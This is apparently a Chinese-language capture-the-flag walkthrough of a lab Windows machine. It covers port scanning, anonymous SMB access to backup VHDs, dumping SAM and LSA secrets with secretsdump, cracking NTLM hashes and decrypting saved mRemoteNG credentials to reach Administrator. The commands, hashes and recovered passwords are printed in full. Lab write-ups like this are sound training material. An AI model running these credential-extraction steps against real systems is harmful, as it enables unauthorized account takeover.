
# 信息收集

tcp

```bash
┌──(root㉿MJ)-[/tmp/test]
└─# nmap --min-rate 1000 -p- 10.129.136.29
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-08 12:42 CST
Nmap scan report for 10.129.136.29 (10.129.136.29)
Host is up (0.20s latency).
Not shown: 65522 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 76.57 seconds


┌──(root㉿MJ)-[/tmp/test]
└─# nmap -sV -sC -O -p$port 10.129.136.29
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-08 12:45 CST
Nmap scan report for 10.129.136.29 (10.129.136.29)
Host is up (0.14s latency).

PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey:
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 or 2012 R2 (97%), Microsoft Windows Server 2012 (95%), Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1 (94%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2012 R2 Update 1 (93%), Microsoft Windows Server 2016 or Server 2019 (93%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (93%), Microsoft Windows Vista SP1 (93%), Microsoft Windows Server 2012 or Server 2012 R2 (93%), Microsoft Windows 7 or Windows Server 2008 R2 or Windows 8.1 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```
开放了ssh，smb，winrm还有几个http，先从smb入手了

## 🧐 Nmap 结果分析：5985 端口

Nmap 的服务探测 (Service Detection) 在这种情况下是**正确的**，但它识别的是**基础技术栈**，而不是**上层协议**。

### 1. 结论：5985 **就是** WinRM

端口 5985/tcp 是 **Windows Remote Management (WinRM)** 的**标准 HTTP 端口**。

- **WinRM** 使用 **WS-Management 协议**，该协议通常是通过 **HTTP/HTTPS** 传输的。
    
- WinRM 的默认端口是：
    
    - **5985/tcp** (HTTP)
        
    - **5986/tcp** (HTTPS)
        

### 2. Nmap 为什么显示 `http`？

Nmap 报告 `Microsoft HTTPAPI httpd 2.0` 是因为：

- **技术基础：** WinRM 监听器依赖于 **Windows HTTP API (HTTPAPI/2.0)** 来接收连接。Nmap 准确地识别了底层 HTTP 协议栈。
    
- **服务描述：** Nmap 在对 5985 端口进行服务指纹识别时，通常会得到一个标准的 HTTP 响应，但由于这不是一个提供网页的 Web 服务器（例如 IIS 或 Apache），它就报告了底层的 **Microsoft HTTPAPI httpd 2.0**。
    

**关键点：** 如果端口 **5985** 在 Windows 机器上开放，并且报告了 `Microsoft HTTPAPI`，那么**几乎可以确定它就是 WinRM 服务**。



udp
```bash
┌──(root㉿MJ)-[/tmp/test]
└─# nmap -sU --top-ports 20 10.129.136.29
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-08 12:42 CST
Nmap scan report for 10.129.136.29 (10.129.136.29)
Host is up (0.17s latency).

PORT      STATE         SERVICE
53/udp    closed        domain
67/udp    closed        dhcps
68/udp    closed        dhcpc
69/udp    closed        tftp
123/udp   open|filtered ntp
135/udp   closed        msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   closed        netbios-ssn
161/udp   closed        snmp
162/udp   closed        snmptrap
445/udp   closed        microsoft-ds
500/udp   open|filtered isakmp
514/udp   closed        syslog
520/udp   closed        route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  closed        upnp
4500/udp  open|filtered nat-t-ike
49152/udp closed        unknown

Nmap done: 1 IP address (1 host up) scanned in 48.71 seconds
```


# smb

基本信息先看一下，一般是能跑出来哪个共享文件夹可匿名访问的，不过这里，我这个有点问题
```bash
┌──(root㉿MJ)-[/tmp/test]
└─# enum4linux -a 10.129.136.29
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Dec  8 12:50:49 2025

 =========================================( Target Information )=========================================

Target ........... 10.129.136.29
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 10.129.136.29 )===========================


[E] Can't find workgroup/domain



 ===============================( Nbtstat Information for 10.129.136.29 )===============================

Looking up status of 10.129.136.29
No reply from 10.129.136.29

 ===================================( Session Check on 10.129.136.29 )===================================


[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.

┌──(root㉿MJ)-[/tmp/test]
└─# smbclient -L 10.129.136.29 -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Backups         Disk
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
```
列出来这些，大概率就是Backups了，有个文件提示别dump到本地
```bash
┌──(root㉿MJ)-[/tmp/test]
└─# cat note.txt

Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
```
在这可以发现几个vhd文件，不过windows的这种虚拟磁盘文件都很大，所以下到本地太慢了
```bash
mb: \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\> ls
  .                                  Dn        0  Fri Feb 22 20:45:32 2019
  ..                                 Dn        0  Fri Feb 22 20:45:32 2019
  9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd     An 37761024  Fri Feb 22 20:44:03 2019
  9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd     An 5418299392  Fri Feb 22 20:45:32 2019
  BackupSpecs.xml                    An     1186  Fri Feb 22 20:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml     An     1078  Fri Feb 22 20:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml     An     8930  Fri Feb 22 20:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml     An     6542  Fri Feb 22 20:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml     An     2894  Fri Feb 22 20:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml     An     1488  Fri Feb 22 20:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml     An     1484  Fri Feb 22 20:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml     An     3844  Fri Feb 22 20:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml     An     3988  Fri Feb 22 20:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml     An     7110  Fri Feb 22 20:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml     An  2374620  Fri Feb 22 20:45:32 2019

                5638911 blocks of size 4096. 1171288 blocks available
smb: \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\>
```
直接这样把磁盘挂载上去

```bash
┌──(root㉿MJ)-[/tmp/test]
└─# guestmount --add '/mnt/vhd/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd' --inspector --ro /mnt/vhd1
Warning: program compiled against libxml 215 using older 214
guestmount: no operating system was found on this disk

If using guestfish ‘-i’ option, remove this option and instead
use the commands ‘run’ followed by ‘list-filesystems’.
You can then mount filesystems you want by hand using the
‘mount’ or ‘mount-ro’ command.

If using guestmount ‘-i’, remove this option and choose the
filesystem(s) you want to see by manually adding ‘-m’ option(s).
Use ‘virt-filesystems’ to see what filesystems are available.

If using other virt tools, this disk image won’t work
with these tools.  Use the guestfish equivalent commands
(see the virt tool manual page).
```
不过第一个挂载在os识别失败了，可能不是正常的目录结构

可以这样挂载，先识别下然后指定挂载设备

```bash
┌──(root㉿MJ)-[/tmp/test]
└─# virt-filesystems --long -a '/mnt/vhd/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd'
Warning: program compiled against libxml 215 using older 214
Name       Type        VFS   Label            Size       Parent
/dev/sda1  filesystem  ntfs  System Reserved  104853504  -

┌──(root㉿MJ)-[/tmp/test]
└─# guestmount --add '/mnt/vhd/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd' --ro - /mnt/vhd1

┌──(root㉿MJ)-[/tmp/test]
└─# virt-filesystems --long -a '/mnt/vhd/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd'

┌──(root㉿MJ)-[/tmp/test]
└─# guestmount --add '/mnt/vhd/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd' --ro -m /dev/sda1 /mnt/vhd1
Warning: program compiled against libxml 215 using older 214
```


```bash
┌──(root㉿MJ)-[/tmp/test]
└─# guestmount --add '/mnt/vhd/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd' --inspector --ro /mnt/vhd2
Warning: program compiled against libxml 215 using older 214
```
第二个挂载成功了

不过明显第一个没什么价值
```bash
┌──(root㉿MJ)-[/tmp/test]
└─# cd /mnt/vhd1

┌──(root㉿MJ)-[/mnt/vhd1]
└─# ls
 Boot   bootmgr   BOOTSECT.BAK  'System Volume Information'

┌──(root㉿MJ)-[/mnt/vhd1]
└─# cd ..

┌──(root㉿MJ)-[/mnt]
└─# cd vhd2

┌──(root㉿MJ)-[/mnt/vhd2]
└─# ls
'$Recycle.Bin'   config.sys                pagefile.sys   ProgramData      Recovery                     Users
 autoexec.bat   'Documents and Settings'   PerfLogs      'Program Files'  'System Volume Information'   Windows
```

现在去吧system里的SAM，SYSTEM，SECURITY都拉到本地，破解一手密码
```bash
┌──(.venv)─(root㉿MJ)-[/tmp/test]
└─# secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DefaultPassword
(Unknown User):bureaulampje
[*] DPAPI_SYSTEM
dpapi_machinekey:0x32764bdcb45f472159af59f1dc287fd1920016a6
dpapi_userkey:0xd2e02883757da99914e3138496705b223e9d03dd
[*] Cleaning up...
```


这里出了个默认密码
## 🔑 LSA Secrets 和 `DefaultPassword` 的作用

LSA Secrets 是存储在 Windows 注册表 **`SECURITY`** 配置单元中的一类敏感数据。

### 1. 什么是 LSA Secrets?

**LSA (Local Security Authority)** 是 Windows 操作系统中的一个保护进程，负责管理本地安全策略、用户身份验证和密钥。LSA Secrets 是 LSA 存储的各种**加密数据**，用于系统内部操作，包括：

- 服务账户的明文密码。
    
- 计算机账户在加入域时生成的密码。
    
- 应用程序（如 IIS 或其他服务）可能硬编码存储的凭据。
    
- 加密文件系统 (EFS) 恢复代理的密码。
    

### 2. `DefaultPassword` 的来源

`DefaultPassword` 是 LSA Secrets 中一个**非标准但常见**的条目，它通常是由于以下原因之一被写入注册表：

- **系统/服务配置：** 某些第三方服务、内部应用程序或自定义脚本在安装或配置过程中，会利用 LSA 机制存储一个用于**默认连接**或**服务运行**的密码。
    
- **配置错误：** 尽管 LSA Secrets 是加密的，但它仍然是一个集中存储敏感凭据的位置。开发人员或系统管理员有时会错误地使用 LSA 来存储一个**通用密码**或**回退密码**，特别是用于数据库、邮件服务器或备份服务的连接。
    

### 3. `secretsdump.py` 如何找到它？

`secretsdump.py` 的作用就是利用 **`SYSTEM`** 文件中的密钥来解密 **`SECURITY`** 文件中的 LSA Secrets。它会扫描并解密所有找到的 LSA Secret 条目，并将它们以明文形式显示出来，其中就包括了 `DefaultPassword` 这个条目及其对应的明文值 `bureaulampje`。

---

## 结论

`DefaultPassword` 出现表明该系统上有一个或多个服务、应用程序或配置，**在 LSA 存储中注册了一个名为 `DefaultPassword` 的敏感凭据**。对于渗透测试来说，这通常是一个**高价值的发现**，因为该密码很可能在系统中的其他地方被重用


| **用户名**           | **RID** | **LM Hash**                        | **NT Hash**                        |
| ----------------- | ------- | ---------------------------------- | ---------------------------------- |
| **Administrator** | 500     | `aad3b435b51404eeaad3b435b51404ee` | `31d6cfe0d16ae931b73c59d7e0c089c0` |
| Guest             | 501     | `aad3b435b51404eeaad3b435b51404ee` | `31d6cfe0d16ae931b73c59d7e0c089c0` |
| **L4mpje**        | 1000    | `aad3b435b51404eeaad3b435b51404ee` | `26112010952d963c8dc4217daec986d9` |
`31d6cfe0d16ae931b73c59d7e0c089c0`就是空密码

可以再破解一下L4mpje密码
```bash
┌──(.venv)─(root㉿MJ)-[/tmp/test]
└─# hashcat -m 1000 l4mpje_ntlm.txt --show
26112010952d963c8dc4217daec986d9:bureaulampje
```
密码复用了，如果这个密码是强密码的话，hashcat跑不出来也可以考虑下密码复用

# 立足点

靶机开放了winrm以及ssh，都可以用凭据试一下

不过winrm连接失败了
```bash
┌──(root㉿MJ)-[/tmp/test]
└─# evil-winrm -i 10.129.136.29 -u 'L4mpje' -p 'bureaulampje'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code 1
```

### WinRM 的权限要求

默认情况下，Windows 限制了哪些用户组可以通过 WinRM 连接到系统。低权限用户 (`L4mpje`) 无法连接，是因为：

1. **非管理员限制：** WinRM 默认要求用户是 **Administrators (管理员)** 组的成员，或者必须是 **Remote Management Users (远程管理用户)** 组的成员。
    
2. **`L4mpje` 是低权限用户：** 之前的分析已经确定 `L4mpje` 不是本地管理员，因此它不属于 Administrators 组，很可能也不属于 Remote Management Users 组。

ssh连接可以成功，发现装了个mRmoteNG
```bash
l4mpje@BASTION C:\Program Files (x86)>dir
 Volume in drive C has no label.
 Volume Serial Number is 1B7D-E692

 Directory of C:\Program Files (x86)

22-02-2019  14:01    <DIR>          .
22-02-2019  14:01    <DIR>          ..
16-07-2016  14:23    <DIR>          Common Files
23-02-2019  09:38    <DIR>          Internet Explorer
16-07-2016  14:23    <DIR>          Microsoft.NET
22-02-2019  14:01    <DIR>          mRemoteNG
23-02-2019  10:22    <DIR>          Windows Defender
23-02-2019  09:38    <DIR>          Windows Mail
23-02-2019  10:22    <DIR>          Windows Media Player
16-07-2016  14:23    <DIR>          Windows Multimedia Platform
16-07-2016  14:23    <DIR>          Windows NT
23-02-2019  10:22    <DIR>          Windows Photo Viewer
16-07-2016  14:23    <DIR>          Windows Portable Devices
16-07-2016  14:23    <DIR>          WindowsPowerShell
               0 File(s)              0 bytes
              14 Dir(s)   4.797.595.648 bytes free
```
## 🔑 提权思路：利用 mRemoteNG 凭据

由于 `mRemoteNG` 是一个远程连接工具，**几乎肯定**存储了用户 **L4mpje** 或其他管理员连接到服务器的**保存凭据**。

**🚨 关键点：** `mRemoteNG` 在默认配置下，会使用 Windows 的 **DPAPI** (Data Protection API) 来**加密**存储在 XML 文件中的密码。

- **如果密码是明文/简单的 Base64：** 你将直接获得高权限账户（如 Administrator）的密码。
    
- **如果密码是 DPAPI 加密数据：** 你需要将该加密数据和你在 VHD 文件中提取的 **DPAPI_SYSTEM** 或 **DPAPI_USERKEY** 密钥结合使用，才能解密出明文密码。

可以找到config文件
```bash
l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>dir
 Volume in drive C has no label.
 Volume Serial Number is 1B7D-E692

 Directory of C:\Users\L4mpje\AppData\Roaming\mRemoteNG

22-02-2019  14:03    <DIR>          .
22-02-2019  14:03    <DIR>          ..
22-02-2019  14:03             6.316 confCons.xml
22-02-2019  14:02             6.194 confCons.xml.20190222-1402277353.backup
22-02-2019  14:02             6.206 confCons.xml.20190222-1402339071.backup
22-02-2019  14:02             6.218 confCons.xml.20190222-1402379227.backup
22-02-2019  14:02             6.231 confCons.xml.20190222-1403070644.backup
22-02-2019  14:03             6.319 confCons.xml.20190222-1403100488.backup
22-02-2019  14:03             6.318 confCons.xml.20190222-1403220026.backup
22-02-2019  14:03             6.315 confCons.xml.20190222-1403261268.backup
22-02-2019  14:03             6.316 confCons.xml.20190222-1403272831.backup
22-02-2019  14:03             6.315 confCons.xml.20190222-1403433299.backup
22-02-2019  14:03             6.316 confCons.xml.20190222-1403486580.backup
22-02-2019  14:03                51 extApps.xml
22-02-2019  14:03             5.217 mRemoteNG.log
22-02-2019  14:03             2.245 pnlLayout.xml
22-02-2019  14:01    <DIR>          Themes
              14 File(s)         76.577 bytes
               3 Dir(s)   4.797.595.648 bytes free
```
复制一下拿到本地跑一下就出了
```bash
┌──(.venv)─(root㉿MJ)-[/tmp/test]
└─# python3 mRemoteNG.py -rf config.xml
Username: Administrator
Hostname: 127.0.0.1
Password: thXLHM96BeKL0ER2

Username: L4mpje
Hostname: 192.168.1.75
Password: bureaulampje
```

按理说再用winrm应该就可以上去了，不过可能是开启了远程 UAC 限制所以一样上不去，ssh连一下就行了，psexec也是能上去的




